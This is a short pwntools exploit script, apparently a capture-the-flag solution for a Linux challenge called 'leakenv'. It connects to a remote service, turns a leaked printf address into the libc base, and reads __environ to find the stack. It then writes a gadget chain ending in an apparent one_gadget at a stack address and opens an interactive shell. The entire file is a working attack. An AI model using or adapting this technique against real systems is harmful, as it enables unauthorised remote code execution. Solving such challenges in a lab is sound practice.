from pwn import *
context(arch="amd64",os="linux",log_level="debug")
libc=ELF("../dist/libc.so.6")
#s=process("./leakenv")
s=remote("192.168.3.253",52003)
s.recvuntil(b"Here's your gift: ")
libc.address=eval(s.recvline()[:-1])-libc.sym.printf
environ=libc.sym.__environ
s.sendlineafter(b"read?",hex(environ)[2:].encode())
s.recvuntil(b"Here you are: ")
stack=u64(s.recv(8))
target=stack-0x100
s.sendlineafter(b"it?",hex(target)[2:].encode())
s.sendafter(b"it.\n",flat([
    0x0000000000023b63+libc.address,0,0,0,0,
    libc.address+0xe3afe,
]))
s.interactive()